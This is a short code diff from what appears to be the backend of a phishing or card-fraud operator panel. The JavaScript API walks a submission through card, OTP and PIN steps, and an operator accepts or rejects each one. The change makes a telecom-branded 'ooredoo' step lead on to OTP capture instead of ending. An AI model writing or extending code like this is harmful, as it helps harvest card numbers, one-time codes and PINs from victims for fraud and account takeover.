@@ -174,7 +174,7 @@ async function api(req, res, url) {
       if (decision === "reject") {
         o.decision = "reject"; o.reason = step; o.status = "rejected"; o.next = "";
       } else {
-        const nextOf = { card: "otp", otp: "pin", pin: "done", ooredoo: "done" };
+        const nextOf = { card: "otp", otp: "pin", pin: "done", ooredoo: "otp" };
         const next = nextOf[step];
         o.decision = "accept"; o.reason = "";
         if (next === "done") { o.status = "confirmed"; o.next = "done"; }
